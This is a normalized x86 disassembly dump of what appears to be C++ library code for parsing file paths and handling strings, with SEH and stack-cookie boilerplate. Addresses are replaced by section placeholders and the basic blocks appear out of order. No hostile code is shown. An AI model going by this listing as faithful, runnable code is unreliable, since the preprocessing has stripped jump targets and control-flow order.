cmp ax 0x2f
je r-xdata
mov edi [ edi ]
cmp ax 0x5c
jne r-xdata
pop edi
pop esi
mov eax 0x2
pop ebx
retn
cmp ax 0x5c
jne r-xdata
push 0x2
mov ecx esi
call sub_10007092
movzx eax [ eax ]
cmp ax 0x2f
je r-xdata
cmp ax 0x5c
jne r-xdata
mov ecx 0x8
cmp ax 0x5c
je r-xdata
push 0x2
push r--data
mov ecx esi
call sub_10024ca0
cmp eax ebx
jb r-xdata
pop edi
pop esi
pop ebx
retn
pop edi
pop esi
or eax 0xffffffff
pop ebx
retn
sub_10024f40
sub esp 0x8
mov eax [ ecx ]
mov ecx [ ecx + 0x4 ]
mov edx [ esp + 0x10 ]
neg edx
mov [ esp + 0x4 ] ecx
push edx
lea ecx [ esp + 0x4 ]
mov [ esp + 0x4 ] eax
call sub_10018eb2
mov eax [ esp + 0xc ]
mov ecx [ esp ]
mov edx [ esp + 0x4 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
add esp 0x8
retn 0x8
sub_10024f80
sub esp 0x8
push esi
mov esi ecx
mov eax [ esi + 0x14 ]
push edi
push eax
push esi
call sub_10024cd0
mov edi eax
mov eax [ esi + 0x14 ]
add esp 0x8
test eax eax
je r-xdata
mov [ esp + 0xb ] 0x0
cmp edi eax
jbe r-xdata
cmp edi 0x1
jne r-xdata
push ebx
push ebp
lea ebx [ edi - 0x1 ]
lea ebp [ edi + edi - 0x2 ]
lea ecx [ ecx ]
cmp [ esi + 0x18 ] 0x8
jb r-xdata
call sub_10027827
mov eax edi
pop edi
pop esi
add esp 0x8
retn
test ecx ecx
jne r-xdata
pop ebp
pop ebx
cmp ebx [ esi + 0x14 ]
jbe r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
cmp [ esp + 0xb ] cl
je r-xdata
cmp [ esi + 0x18 ] 0x8
jb r-xdata
call sub_10027827
mov ecx [ esp + 0x14 ]
mov [ esp + 0xb ] 0x1
jmp r-xdata
cmp ax 0x5c
jne r-xdata
movzx eax [ eax + edi * 2 ]
cmp ax 0x2f
je r-xdata
pop edi
or eax 0xffffffff
pop esi
add esp 0x8
retn
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
push edi
push esi
call sub_10024dd0
add esp 0x8
mov ecx eax
mov [ esp + 0xc ] ecx
test edi edi
jbe r-xdata
dec edi
sub ebp 0x2
dec ebx
test edi edi
ja r-xdata
cmp ax 0x5c
jne r-xdata
movzx eax [ eax + ebp ]
cmp ax 0x2f
je r-xdata
cmp ebx ecx
je r-xdata
sub_10025070
push 0xffffffff
push sub_1004e583
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x10 ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ esp + 0xc ] esi
mov [ esi + 0x4 ] 0x1
mov edi [ esp + 0x20 ]
xor edx edx
mov [ esi ] r--data
mov [ esi + 0x8 ] edx
mov eax [ edi + 0xc ]
mov [ esi + 0xc ] eax
mov ecx [ edi + 0x10 ]
mov [ esi + 0x10 ] ecx
mov al [ edi + 0x14 ]
mov [ esi + 0x14 ] al
push 0xffffffff
lea ecx [ esi + 0x18 ]
lea eax [ edi + 0x18 ]
push edx
mov [ ecx + 0x18 ] 0xf
mov [ ecx + 0x14 ] edx
push eax
mov [ esp + 0x24 ] edx
mov [ ecx + 0x4 ] dl
call sub_100021c3
push edi
push esi
mov [ esp + 0x20 ] 0x1
call sub_1003f840
add esp 0x8
mov eax esi
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
add esp 0x10
retn 0x4
sub_10025110
push 0xffffffff
push sub_1004e5ef
mov eax [ fs : 0x0 ]
push eax
sub esp 0x98
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xa8 ]
mov [ fs : 0x0 ] eax
mov edi [ esp + 0xb8 ]
xor ebx ebx
mov [ esp + 0x10 ] ebx
test edi edi
je r-xdata
mov eax 0x2
mov ecx [ esp + 0xa8 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
add esp 0xa4
retn
cmp [ edi ] ebx
jne r-xdata
push 0x10
call sub_1002738b
mov esi eax
add esp 0x4
mov [ esp + 0x14 ] esi
mov [ esp + 0xb0 ] ebx
test esi esi
je r-xdata
xor eax eax
mov ecx [ esp + 0xbc ]
lea eax [ esp + 0x18 ]
push eax
call sub_1000792f
push eax
lea ecx [ esp + 0x38 ]
mov [ esp + 0xb4 ] 0x1
mov [ esp + 0x14 ] 0x1
call sub_100078da
push 0x0
mov ebx 0x3
push eax
mov ecx esi
mov [ esp + 0xb8 ] 0x2
mov [ esp + 0x18 ] ebx
call sub_100247d0
jmp r-xdata
test bl 0x1
je r-xdata
and ebx 0xfffffffd
lea ecx [ esp + 0x34 ]
mov [ esp + 0x10 ] ebx
call sub_1000794c
mov [ edi ] eax
mov [ esp + 0xb0 ] 0x3
test bl 0x2
je r-xdata
cmp [ esp + 0x30 ] 0x10
jb r-xdata
mov ecx [ esp + 0x1c ]
push ecx
call sub_100272e8
add esp 0x4
sub_10025220
sub esp 0x8
push ebx
mov ebx ecx
mov edx [ ebx + 0x14 ]
push esi
push edi
test edx edx
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x8
retn
mov ecx [ ebx + 0x18 ]
lea edi [ ebx + 0x4 ]
cmp ecx 0x8
jb r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
call sub_10027827
cmp ecx 0x8
jb r-xdata
lea esi [ eax + edx * 2 ]
test esi esi
je r-xdata
cmp [ ebp ] 0x3a
pop ebp
je r-xdata
test esi esi
jne r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov edx [ ebx + 0x18 ]
cmp edx 0x8
jb r-xdata
cmp [ esi + 0x18 ] 0x8
jb r-xdata
call sub_10027827
cmp ecx 0x8
jb r-xdata
cmp eax esi
ja r-xdata
mov ecx edi
mov ecx [ edi ]
jmp r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
call sub_10027827
cmp edx 0x8
jb r-xdata
mov eax [ ebx + 0x14 ]
add eax eax
lea esi [ eax + ecx ]
test esi esi
je r-xdata
call sub_10027827
mov ecx [ esi + 0x14 ]
lea edx [ eax + ecx * 2 ]
cmp ebp edx
jb r-xdata
push ebp
push 0xffffffff
lea ecx [ esp + 0x14 ]
mov [ esp + 0x14 ] ebx
mov [ esp + 0x18 ] esi
call sub_10018eb2
mov esi [ esp + 0x10 ]
mov ebp [ esp + 0x14 ]
cmp esi 0xfffffffc
je r-xdata
lea eax [ eax + edx * 2 ]
cmp esi eax
jbe r-xdata
movzx eax [ edi ]
cmp ax 0x2f
je r-xdata
test esi esi
jne r-xdata
mov ecx edi
mov ecx [ edi ]
jmp r-xdata
cmp ax 0x5c
je r-xdata
cmp [ esi + 0x18 ] 0x8
jb r-xdata
call sub_10027827
cmp edx 0x8
jb r-xdata
cmp ecx esi
ja r-xdata
mov esi [ ebx + 0x14 ]
push 0x5c
push 0x1
mov ecx ebx
call sub_10005db8
pop edi
mov eax esi
pop esi
pop ebx
add esp 0x8
retn
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
add eax edi
cmp esi eax
jbe r-xdata
mov edi [ edi ]
call sub_10027827
mov ecx [ esi + 0x14 ]
lea edx [ eax + ecx * 2 ]
cmp edi edx
jb r-xdata
push 0xffffffff
lea ecx [ esp + 0x10 ]
mov [ esp + 0x10 ] ebx
mov [ esp + 0x14 ] esi
call sub_10018eb2
mov esi [ esp + 0xc ]
mov edi [ esp + 0x10 ]
cmp esi 0xfffffffc
je r-xdata
sub_10025380
push 0xffffffff
push sub_1004e61b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x10 ]
mov [ fs : 0x0 ] eax
mov esi ecx
push 0x34
mov [ esp + 0x10 ] 0x0
call sub_1002738b
add esp 0x4
mov [ esp + 0xc ] eax
mov [ esp + 0x18 ] 0x0
test eax eax
je r-xdata
xor eax eax
mov ecx [ esp + 0x20 ]
mov edx [ ecx ]
push edx
mov ecx eax
call sub_10025070
jmp r-xdata
mov eax esi
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
add esp 0x10
retn 0x8
cmp [ rw-data ] 0x0
jne r-xdata
mov edi [ esp + 0x24 ]
mov [ esp + 0x18 ] 0xffffffff
mov [ esi ] eax
test edi edi
je r-xdata
mov eax [ rw-data ]
mov ecx [ esi ]
push eax
push edi
push ecx
call sub_1003ee46
mov edx [ esi ]
add esp 0xc
mov [ edx + 0x10 ] 0x0
mov ecx [ esi ]
push 0x1
push r--data
add ecx 0x18
call sub_10001e2d
push 0x0
lea ecx [ esp + 0x24 ]
call sub_10021e84
cmp [ rw-data ] 0x0
jne r-xdata
lea ecx [ esp + 0x20 ]
call sub_10021eac
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
mov [ rw-data ] eax
sub_10025470
push 0xffffffff
push sub_1004e648
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x28 ]
mov [ fs : 0x0 ] eax
push 0x0
lea ecx [ esp + 0x1c ]
call sub_10021e84
cmp [ rw-data ] 0x0
mov ebx [ rw-data ]
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x10 ] ebx
jne r-xdata
mov edi [ esp + 0x38 ]
mov esi [ rw-data ]
mov eax [ edi ]
cmp esi [ eax + 0xc ]
jae r-xdata
push 0x0
lea ecx [ esp + 0x18 ]
call sub_10021e84
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
jmp r-xdata
mov ecx [ eax + 0x8 ]
mov ecx [ ecx + esi * 4 ]
test ecx ecx
jne r-xdata
lea ecx [ esp + 0x14 ]
call sub_10021eac
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
mov [ rw-data ] eax
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov esi ecx
call sub_10021fbc
cmp esi [ eax + 0xc ]
jae r-xdata
lea ecx [ esp + 0x18 ]
mov [ esp + 0x30 ] 0xffffffff
call sub_10021eac
mov eax esi
mov ecx [ esp + 0x28 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
add esp 0x24
retn
test ebx ebx
je r-xdata
mov edx [ eax + 0x8 ]
mov esi [ edx + esi * 4 ]
jmp r-xdata
lea eax [ esp + 0x10 ]
push edi
push eax
call sub_10025110
add esp 0x8
cmp eax 0xffffffff
jne r-xdata
mov esi ebx
jmp r-xdata
test esi esi
jne r-xdata
mov esi [ esp + 0x10 ]
push 0x0
lea ecx [ esp + 0x3c ]
mov [ rw-data ] esi
call sub_10021e84
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
push r--data
lea ecx [ esp + 0x20 ]
call sub_100274f1
push r--data
lea ecx [ esp + 0x20 ]
push ecx
call sub_1002ae74
lea ecx [ esp + 0x38 ]
call sub_10021eac
push esi
call sub_10022081
add esp 0x4
inc eax
mov [ esi + 0x4 ] eax
sub_100255c0
push 0xffffffff
push sub_1004e6ac
mov eax [ fs : 0x0 ]
push eax
sub esp 0x48
push ebx
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x54 ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ esp + 0xc ] esi
xor ebx ebx
push ebx
call sub_10021e84
mov eax 0xf
mov [ esi + 0x1c ] eax
mov [ esi + 0x18 ] ebx
mov [ esp + 0x5c ] ebx
mov [ esi + 0x8 ] bl
mov [ esi + 0x38 ] eax
mov [ esi + 0x34 ] ebx
mov [ esi + 0x24 ] bl
mov [ esi + 0x54 ] eax
mov [ esi + 0x50 ] ebx
mov [ esi + 0x40 ] bl
mov [ esi + 0x70 ] eax
mov [ esi + 0x6c ] ebx
mov [ esi + 0x5c ] bl
mov ecx [ esp + 0x64 ]
mov [ esp + 0x5c ] 0x4
cmp ecx ebx
jne r-xdata
push ecx
push esi
call sub_10022228
add esp 0x8
mov eax esi
mov ecx [ esp + 0x54 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
add esp 0x54
retn 0x4
push eax
push r--data
lea ecx [ esp + 0x18 ]
mov [ esp + 0x30 ] eax
mov [ esp + 0x2c ] ebx
mov [ esp + 0x1c ] bl
call sub_10001e2d
lea eax [ esp + 0x10 ]
push eax
lea ecx [ esp + 0x30 ]
mov [ esp + 0x60 ] 0x5
call sub_10001eec
push r--data
lea ecx [ esp + 0x30 ]
push ecx
call sub_1002ae74
sub_10025690
push 0xffffffff
push sub_1004e6e6
mov eax [ fs : 0x0 ]
push eax
sub esp 0x7c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x78 ] eax
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x84 ]
mov [ fs : 0x0 ] eax
mov eax [ esp + 0x94 ]
mov esi ecx
mov [ esp + 0x8 ] esi
mov [ esi + 0x4 ] eax
push r--data
lea ecx [ esp + 0x10 ]
mov [ esp + 0x90 ] 0x0
mov [ esi ] r--data
call sub_100255c0
mov [ esp + 0x8c ] 0x1
call sub_10022358
lea ecx [ esp + 0xc ]
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
mov [ esp + 0x8c ] 0x0
call sub_1000794c
mov eax esi
mov ecx [ esp + 0x84 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov ecx [ esp + 0x78 ]
xor ecx esp
call sub_10027150
add esp 0x88
retn 0x4
sub_10025780
push ebx
mov ebx [ esp + 0x8 ]
mov edx [ ebx + 0x14 ]
push ebp
mov ebp ecx
test edx edx
je r-xdata
mov eax ebp
pop ebp
pop ebx
retn 0x4
mov ecx [ ebx + 0x18 ]
push esi
push edi
lea esi [ ebx + 0x4 ]
cmp ecx 0x8
jb r-xdata
mov edi esi
mov edi [ esi ]
jmp r-xdata
call sub_10027827
cmp ecx 0x8
jb r-xdata
test edi edi
je r-xdata
movzx eax [ edi ]
pop edi
pop esi
cmp ax 0x2f
je r-xdata
cmp [ ebx + 0x18 ] 0x8
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
push 0xffffffff
push 0x0
push ebx
mov ecx ebp
call sub_100070e4
cmp ax 0x5c
je r-xdata
mov ecx [ ebx + 0x14 ]
lea edx [ esi + ecx * 2 ]
cmp edi edx
jb r-xdata
mov esi [ esi ]
cmp ecx 0x8
jb r-xdata
cmp eax edi
ja r-xdata
mov ecx ebp
call sub_10025220
call sub_10027827
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp ebx 0xfffffffc
je r-xdata
lea eax [ eax + edx * 2 ]
cmp edi eax
jbe r-xdata
sub_10025820
push 0xffffffff
push sub_1004e733
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x1c ]
mov [ fs : 0x0 ] eax
mov [ esp + 0x14 ] 0x0
call sub_1002218e
mov edi eax
mov [ esp + 0x14 ] edi
call sub_10021fbc
push 0x0
lea ecx [ esp + 0x14 ]
mov esi eax
call sub_10021e84
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
lea ecx [ esp + 0x10 ]
call sub_10021eac
push 0x10
mov [ esp + 0x28 ] 0x0
call sub_1002738b
mov esi eax
add esp 0x4
mov [ esp + 0x18 ] esi
mov [ esp + 0x24 ] 0x1
test esi esi
je r-xdata
inc eax
mov [ esi + 0x4 ] eax
xor esi esi
push 0x0
mov ecx esi
call sub_10025690
mov [ esi ] r--data
jmp r-xdata
mov eax ebp
mov ecx [ esp + 0x1c ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
add esp 0x18
retn
push 0x0
lea ecx [ esp + 0x30 ]
call sub_10021e84
mov eax [ edi + 0x4 ]
test eax eax
jbe r-xdata
mov ebp [ esp + 0x2c ]
push esi
lea eax [ esp + 0x18 ]
push eax
mov ecx ebp
mov [ esp + 0x2c ] 0x0
call sub_10025380
mov [ esp + 0x24 ] 0xffffffff
test edi edi
je r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
not esi
lea ecx [ esp + 0x2c ]
and esi edi
call sub_10021eac
test esi esi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
dec eax
mov [ edi + 0x4 ] eax
sub_10025930
push 0xffffffff
push sub_1004e75e
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov eax 0x1
test [ rw-data ] al
jne r-xdata
mov eax rw-data
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
pop ecx
add esp 0xc
retn
or [ rw-data ] eax
push rw-data
mov [ esp + 0x10 ] 0x0
call sub_10025820
push sub_100536f0
call sub_1002c1a3
add esp 0x8
sub_100259a0
push 0xffffffff
push sub_1004e78e
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov eax 0x1
test [ rw-data ] al
jne r-xdata
mov eax rw-data
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
pop ecx
add esp 0xc
retn
or [ rw-data ] eax
mov [ esp + 0xc ] 0x0
call sub_10025930
push eax
call sub_10025470
add esp 0x4
mov [ rw-data ] eax
sub_10025a10
push 0xffffffff
push sub_1004e7c0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x2c ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ esp + 0xc ] esi
mov eax 0x7
xor ecx ecx
mov [ esi + 0x18 ] eax
mov [ esi + 0x14 ] 0x0
mov [ esi + 0x4 ] cx
xor edx edx
mov [ esp + 0x14 ] dx
mov edx [ esp + 0x3c ]
mov [ esp + 0x28 ] eax
mov eax edx
mov [ esp + 0x34 ] ecx
mov [ esp + 0x24 ] ecx
lea edi [ eax + 0x2 ]
lea esp [ esp ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edi
sar eax 0x1
push eax
push edx
lea ecx [ esp + 0x18 ]
call sub_10001667
mov [ esp + 0x34 ] 0x1
call sub_100259a0
mov eax [ eax ]
push eax
lea eax [ esp + 0x14 ]
push esi
push eax
call sub_1000c656
add esp 0xc
cmp [ esp + 0x28 ] 0x8
jb r-xdata
mov eax esi
mov ecx [ esp + 0x2c ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
add esp 0x2c
retn 0x8
mov ecx [ esp + 0x14 ]
push ecx
call sub_100272e8
add esp 0x4
sub_10025ad0
push 0xffffffff
push sub_1004e7f0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x20 ] eax
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x2c ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ esp + 0x3c ]
xor edx edx
xor eax eax
mov [ esi + 0x18 ] 0x7
mov [ esi + 0x14 ] edx
mov [ esp + 0x8 ] esi
mov [ esi + 0x4 ] ax
mov eax [ esp + 0x40 ]
mov [ esp + 0x34 ] edx
cmp ecx eax
je r-xdata
mov eax esi
mov ecx [ esp + 0x2c ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov ecx [ esp + 0x20 ]
xor ecx esp
call sub_10027150
add esp 0x30
retn 0x8
sub eax ecx
sar eax 0x1
push eax
push ecx
lea ecx [ esp + 0x14 ]
mov [ esp + 0x2c ] 0x7
mov [ esp + 0x28 ] edx
mov [ esp + 0x18 ] dx
call sub_10001667
mov [ esp + 0x34 ] 0x1
call sub_100259a0
mov ecx [ esp + 0x24 ]
mov eax [ esp + 0x10 ]
mov edx eax
cmp ecx 0x8
jae r-xdata
mov ecx [ esp + 0x20 ]
lea edx [ edx + ecx * 2 ]
push edx
push eax
mov ecx esi
call sub_1000ccdc
cmp [ esp + 0x24 ] 0x8
jb r-xdata
lea edx [ esp + 0x10 ]
mov eax edx
mov eax [ esp + 0x10 ]
push eax
call sub_100272e8
add esp 0x4
sub_10025bb0
push 0xffffffff
push sub_1004e86b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x3c
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x50 ]
mov [ fs : 0x0 ] eax
mov esi ecx
xor ebp ebp
mov [ esp + 0x14 ] ebp
call sub_10024f80
cmp eax 0xffffffff
jne r-xdata
mov edi [ esi + 0x18 ]
lea ecx [ esi + 0x4 ]
cmp edi 0x8
jb r-xdata
mov edi 0x7
xor eax eax
mov [ esp + 0x4c ] edi
mov [ esp + 0x48 ] ebp
mov [ esp + 0x38 ] ax
lea eax [ esp + 0x34 ]
lea ebx [ ebp + 0x1 ]
jmp r-xdata
mov edx ecx
mov edx [ ecx ]
jmp r-xdata
mov esi [ esp + 0x60 ]
push 0xffffffff
xor ecx ecx
mov [ esi + 0x18 ] edi
mov [ esi + 0x14 ] ebp
push ebp
mov [ esi + 0x4 ] cx
push eax
mov ecx esi
mov [ esp + 0x20 ] ebx
mov [ esp + 0x64 ] ebx
call sub_1000253c
or ebx 0x4
test bl 0x2
je r-xdata
lea edx [ edx + eax * 2 ]
push edx
push ecx
lea ecx [ esp + 0x20 ]
call sub_10025ad0
mov ebx 0x2
mov edi 0x7
mov ecx [ ecx ]
cmp edi 0x8
jb r-xdata
test bl 0x1
je r-xdata
and ebx 0xfffffffd
cmp [ esp + 0x30 ] 0x8
jb r-xdata
mov eax esi
mov ecx [ esp + 0x50 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x48
retn 0x4
cmp [ esp + 0x4c ] 0x8
jb r-xdata
xor eax eax
mov [ esp + 0x30 ] edi
mov [ esp + 0x2c ] ebp
mov [ esp + 0x1c ] ax
mov edx [ esp + 0x1c ]
push edx
call sub_100272e8
add esp 0x4
mov ecx [ esp + 0x38 ]
push ecx
call sub_100272e8
add esp 0x4
sub_10025cc0
sub esp 0xc
push ebp
mov ebp ecx
mov edx [ ebp + 0x18 ]
push esi
push edi
lea eax [ ebp + 0x4 ]
cmp edx 0x8
jb r-xdata
mov [ esp + 0xc ] eax
mov esi eax
mov esi [ eax ]
mov [ esp + 0xc ] esi
jmp r-xdata
call sub_10027827
cmp edx 0x8
jb r-xdata
test esi esi
je r-xdata
mov [ esp + 0x14 ] ecx
pop ebx
test edi edi
jne r-xdata
cmp edx 0xfffffffc
je r-xdata
mov ecx eax
mov ecx [ eax ]
jmp r-xdata
cmp ecx 0xfffffffc
je r-xdata
xor edi edi
jmp r-xdata
sub esi ebx
sar esi 0x1
test edx edx
je r-xdata
cmp edx 0x8
jb r-xdata
cmp ecx esi
ja r-xdata
sub edi [ esp + 0xc ]
sar edi 0x1
test ecx ecx
je r-xdata
mov eax [ esp + 0x2c ]
push 0xffffffff
push 0x0
push eax
push esi
push edi
mov ecx ebp
call sub_1000c75e
pop edi
pop esi
pop ebp
add esp 0xc
retn 0x14
call sub_10027827
mov edi [ esp + 0x24 ]
mov ecx [ esp + 0x20 ]
cmp edx ecx
je r-xdata
mov ecx [ ebp + 0x14 ]
lea edx [ eax + ecx * 2 ]
cmp esi edx
jbe r-xdata
mov eax [ eax ]
call sub_10027827
cmp ecx ebp
je r-xdata
mov eax [ esp + 0x28 ]
mov ecx [ esp + 0x1c ]
mov edi [ esp + 0x20 ]
mov edx [ esp + 0x24 ]
push ebx
mov [ esp + 0x14 ] ecx
mov ebx edi
mov [ esp + 0x14 ] edx
mov esi eax
test eax eax
je r-xdata
sub_10025d90
push 0xffffffff
push sub_1004e8a0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x30 ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov edx [ esp + 0x48 ]
xor ebx ebx
mov eax edx
mov [ esp + 0x2c ] 0xf
mov [ esp + 0x28 ] ebx
mov [ esp + 0x18 ] bl
lea edi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edi
push eax
push edx
lea ecx [ esp + 0x1c ]
call sub_10001e2d
lea eax [ esp + 0x14 ]
push eax
mov ecx esi
mov [ esp + 0x3c ] ebx
call sub_10001eec
cmp [ esp + 0x2c ] 0x10
jb r-xdata
mov eax [ esp + 0x44 ]
mov edx [ esp + 0x40 ]
mov [ esi ] r--data
mov [ esi + 0x2c ] eax
mov [ esi + 0x28 ] edx
mov [ esi + 0x48 ] 0xf
mov [ esi + 0x44 ] ebx
mov [ esi + 0x34 ] bl
mov eax esi
mov ecx [ esp + 0x30 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
add esp 0x2c
retn 0xc
mov ecx [ esp + 0x18 ]
push ecx
call sub_100272e8
add esp 0x4
sub_10025e50
push 0xffffffff
push sub_1004e8c8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x20 ] eax
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x2c ]
mov [ fs : 0x0 ] eax
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4c ]
mov esi ecx
xor ecx ecx
mov [ esp + 0x10 ] cx
mov ecx [ esp + 0x50 ]
push edx
push ecx
push eax
lea ecx [ esp + 0x18 ]
mov [ esp + 0x30 ] 0x7
mov [ esp + 0x2c ] 0x0
call sub_100231b0
mov eax [ esp + 0x48 ]
mov ecx [ esp + 0x44 ]
lea edx [ esp + 0xc ]
push edx
mov edx [ esp + 0x44 ]
push eax
mov eax [ esp + 0x44 ]
push ecx
push edx
push eax
mov ecx esi
mov [ esp + 0x48 ] 0x0
call sub_10025cc0
cmp [ esp + 0x24 ] 0x8
jb r-xdata
mov eax esi
mov ecx [ esp + 0x2c ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov ecx [ esp + 0x20 ]
xor ecx esp
call sub_10027150
add esp 0x30
retn 0x1c
mov ecx [ esp + 0x10 ]
push ecx
call sub_100272e8
add esp 0x4
sub_10025f10
push ebx
push ebp
push esi
push edi
mov edi ecx
mov edx [ edi + 0x18 ]
lea esi [ edi + 0x4 ]
cmp edx 0x10
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
call sub_10027827
cmp edx 0x10
jb r-xdata
mov ecx [ edi + 0x14 ]
lea ebp [ ecx + eax ]
test ebp ebp
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
call sub_10027827
cmp edx 0x10
jb r-xdata
mov ecx [ edi + 0x14 ]
lea ebx [ ecx + eax ]
test ebx ebx
je r-xdata
cmp edx 0x10
jb r-xdata
cmp eax ebp
ja r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp edx 0x10
jb r-xdata
cmp eax ebx
ja r-xdata
mov edx [ edi + 0x18 ]
cmp edx 0x10
jb r-xdata
add ecx eax
cmp ebp ecx
jbe r-xdata
add ecx esi
cmp ebx ecx
jbe r-xdata
mov esi [ esi ]
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
push eax
push ecx
push edx
push ebp
push edi
push ebx
push edi
mov ecx edi
call sub_100162d9
pop edi
pop esi
pop ebp
pop ebx
retn 0xc
sub_10025fb0
push ebx
push ebp
push esi
push edi
mov edi ecx
mov edx [ edi + 0x18 ]
lea esi [ edi + 0x4 ]
cmp edx 0x8
jb r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
call sub_10027827
cmp edx 0x8
jb r-xdata
mov eax [ edi + 0x14 ]
add eax eax
lea ebp [ eax + ecx ]
test ebp ebp
je r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
call sub_10027827
cmp edx 0x8
jb r-xdata
mov eax [ edi + 0x14 ]
add eax eax
lea ebx [ eax + ecx ]
test ebx ebx
je r-xdata
cmp edx 0x8
jb r-xdata
cmp ecx ebp
ja r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
cmp edx 0x8
jb r-xdata
cmp ecx ebx
ja r-xdata
mov edx [ edi + 0x18 ]
cmp edx 0x8
jb r-xdata
add eax ecx
cmp ebp eax
jbe r-xdata
add eax esi
cmp ebx eax
jbe r-xdata
mov esi [ esi ]
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
push eax
push ecx
push edx
push ebp
push edi
push ebx
push edi
mov ecx edi
call sub_10025e50
pop edi
pop esi
pop ebp
pop ebx
retn 0xc
sub_10026060
sub esp 0x54
mov ecx [ esp + 0x6c ]
mov eax [ ecx ]
mov eax [ eax + 0x14 ]
push esi
push edi
mov edi [ esp + 0x68 ]
lea edx [ esp + 0x74 ]
push edx
